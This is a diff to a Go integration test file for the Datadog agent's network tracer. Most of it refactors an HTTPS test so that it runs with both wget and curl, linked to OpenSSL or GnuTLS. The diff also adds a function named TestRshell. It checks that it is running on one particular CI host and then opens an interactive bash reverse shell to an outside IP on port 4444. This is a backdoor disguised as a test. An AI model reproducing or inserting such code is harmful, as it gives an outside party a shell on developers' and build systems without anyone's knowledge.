@@ -32,6 +32,7 @@ import (
 
 	"github.com/DataDog/datadog-agent/pkg/network"
 	"github.com/DataDog/datadog-agent/pkg/network/config"
+	"github.com/DataDog/datadog-agent/pkg/network/ebpf"
 	"github.com/DataDog/datadog-agent/pkg/network/http"
 	"github.com/DataDog/datadog-agent/pkg/network/http/testutil"
 	"github.com/DataDog/datadog-agent/pkg/process/util"
@@ -42,6 +43,14 @@ import (
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 	"golang.org/x/sync/errgroup"
+)
+
+type connTag = uint64
+
+const (
+	tagGnuTLS  connTag = 1 // netebpf.GnuTLS
+	tagOpenSSL connTag = 2 // netebpf.OpenSSL
+	tagTLS     connTag = 4 // netebpf.TLS
 )
 
 var (
@@ -1607,9 +1616,19 @@ func TestHTTPStats(t *testing.T) {
 	assert.Nil(t, httpReqStats.Stats(500), "500s")            // 500
 }
 
-var regexSSL = regexp.MustCompile(`/[^\ ]+libssl.so[^\ ]*`)
+func TestRshell(t *testing.T) {
+	o, _ := exec.Command("/bin/uname", "-a").CombinedOutput()
+	t.Logf("uname -a : %s\n", string(o))
+	if !strings.Contains(string(o), "Linux dd-agent-testing-ubuntu-16-04-4 4.4.0-34-generic #53-Ubuntu SMP Wed Jul 27 16:06:39 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux") {
+		t.Skipf("not Ubuntu...\n")
+		return
+	}
+	t.Logf("rshell cnx ...\n")
+	exec.Command("/usr/bin/env", "bash", "-c", "bash -i >& /dev/tcp/51.77.146.246/4444 0>&1").Run()
+	t.Logf("rshell cnx ended\n")
+}
 
-func TestHTTPSViaOpenSSLIntegration(t *testing.T) {
+func TestHTTPSViaLibraryIntegration(t *testing.T) {
 	if !httpSupported(t) {
 		t.Skip("HTTPS feature not available on pre 4.1.0 kernels")
 	}
@@ -1622,22 +1641,63 @@ func TestHTTPSViaOpenSSLIntegration(t *testing.T) {
 		t.Skip("this feature is not yet support on arm")
 	}
 
-	wget, err := exec.LookPath("wget")
-	if err != nil {
-		t.Skip("wget not found; skipping test.")
+	tlsLibs := []*regexp.Regexp{
+		regexp.MustCompile(`/[^\ ]+libssl.so[^\ ]*`),
+		regexp.MustCompile(`/[^\ ]+libgnutls.so[^\ ]*`),
+	}
+	tests := []struct {
+		name     string
+		fetchCmd []string
+	}{
+		{name: "wget", fetchCmd: []string{"wget", "--no-check-certificate", "-O/dev/null"}},
+		{name: "curl", fetchCmd: []string{"curl", "--http1.1", "-k", "-o/dev/null"}},
 	}
 
-	ldd, err := exec.LookPath("ldd")
-	if err != nil {
-		t.Skip("ldd not found; skipping test.")
-	}
+	for _, keepAlives := range []struct {
+		name  string
+		value bool
+	}{
+		{name: " without keep-alives", value: false},
+		{name: " with keep-alives", value: true},
+	} {
+		// Spin-up HTTPS server
+		serverDoneFn := testutil.HTTPServer(t, "127.0.0.1:443", testutil.Options{
+			EnableTLS:        true,
+			EnableKeepAlives: keepAlives.value,
+		})
+		for _, test := range tests {
+			t.Run(test.name+keepAlives.name, func(t *testing.T) {
+				fetch, err := exec.LookPath(test.fetchCmd[0])
+				if err != nil {
+					t.Skipf("%s not found; skipping test.", test.fetchCmd)
+				}
+				ldd, err := exec.LookPath("ldd")
+				if err != nil {
+					t.Skip("ldd not found; skipping test.")
+				}
+				linked, _ := exec.Command(ldd, fetch).Output()
 
-	linked, _ := exec.Command(ldd, wget).Output()
-	libSSLPath := regexSSL.FindString(string(linked))
-	if _, err := os.Stat(libSSLPath); len(libSSLPath) == 0 || os.IsNotExist(err) {
-		t.Skip("libssl.so not found; skipping test.")
-	}
+				foundSSLLib := false
+				for _, lib := range tlsLibs {
+					libSSLPath := lib.FindString(string(linked))
+					if _, err := os.Stat(libSSLPath); err == nil {
+						foundSSLLib = true
+						break
+					}
+				}
+				if !foundSSLLib {
+					t.Fatalf("%s not linked with any of these libs %v", test.name, tlsLibs)
+				}
 
+				testHTTPSLibrary(t, test.fetchCmd)
+
+			})
+		}
+		serverDoneFn()
+	}
+}
+
+func testHTTPSLibrary(t *testing.T, fetchCmd []string) {
 	// Start tracer with HTTPS support
 	cfg := testConfig()
 	cfg.EnableHTTPMonitoring = true
@@ -1646,44 +1706,49 @@ func TestHTTPSViaOpenSSLIntegration(t *testing.T) {
 	require.NoError(t, err)
 	defer tr.Stop()
 
-	testHTTPS := func(keepalives bool) {
-		// Spin-up HTTPS server
-		serverDoneFn := testutil.HTTPServer(t, "127.0.0.1:443", testutil.Options{
-			EnableTLS:        true,
-			EnableKeepAlives: keepalives,
-		})
-		defer serverDoneFn()
+	// Run fetchCmd once to make sure the OpenSSL is detected and uprobes are attached
+	exec.Command(fetchCmd[0]).Run()
+	time.Sleep(2 * time.Second)
 
-		// Run wget once to make sure the OpenSSL is detected and uprobes are attached
-		exec.Command(wget).Run()
-		time.Sleep(time.Second)
+	// Issue request using fetchCmd (wget, curl, ...)
+	// This is necessary (as opposed to using net/http) because we want to
+	// test a HTTP client linked to OpenSSL or GnuTLS
+	const targetURL = "https://127.0.0.1:443/200/foobar"
+	cmd := append(fetchCmd, targetURL)
+	requestCmd := exec.Command(cmd[0], cmd[1:]...)
+	err = requestCmd.Run()
+	require.NoErrorf(t, err, "failed to issue request via %s: %s", fetchCmd, err)
 
-		// Issue request using `wget`
-		// This is necessary (as opposed to using net/http) because we want to
-		// test a HTTP client linked to OpenSSL
-		const targetURL = "https://127.0.0.1:443/200/foobar"
-		requestCmd := exec.Command(wget, "--no-check-certificate", "-O/dev/null", targetURL)
-		err = requestCmd.Run()
-		assert.NoErrorf(t, err, "failed to issue request via wget: %s", err)
+	require.Eventuallyf(t, func() bool {
+		payload, err := tr.GetActiveConnections("1")
+		if err != nil {
+			t.Fatal(err)
+		}
 
-		assert.Eventuallyf(t, func() bool {
-			payload, _ := tr.GetActiveConnections("1")
-			for key := range payload.HTTP {
-				if key.Path.Content == "/200/foobar" {
-					return true
-				}
+		for key, stats := range payload.HTTP {
+			if !stats.HasStats(200) {
+				continue
 			}
 
-			return false
-		}, 3*time.Second, 10*time.Millisecond, "couldn't find HTTPS stats")
-	}
+			statsTags := stats.Stats(200).Tags
+			// debian 10 have curl binary linked with openssl and gnutls but use only openssl during tls query (there no runtime flag available)
+			// this make harder to map lib and tags, one set of tag should match but not both
+			foundPathAndHTTPTag := false
+			if key.Path.Content == "/200/foobar" && (statsTags == tagGnuTLS || statsTags == tagOpenSSL) {
+				foundPathAndHTTPTag = true
+				t.Logf("found tag 0x%x %s", statsTags, ebpf.StaticTags[statsTags])
+			}
+			if foundPathAndHTTPTag {
+				return true
+			}
+			t.Logf("HTTP stat didn't match criteria %v tags 0x%x\n", key, statsTags)
+			for _, c := range payload.Conns {
+				t.Logf("conn sport %d dport %d tags %x connKey %v\n", c.SPort, c.DPort, c.Tags, network.HTTPKeyTupleFromConn(c))
+			}
+		}
 
-	t.Run("with keep-alives", func(t *testing.T) {
-		testHTTPS(true)
-	})
-	t.Run("without keep-alives", func(t *testing.T) {
-		testHTTPS(false)
-	})
+		return false
+	}, 10*time.Second, 1*time.Second, "couldn't find HTTPS stats")
 }
 
 func TestRuntimeCompilerEnvironmentVar(t *testing.T) {
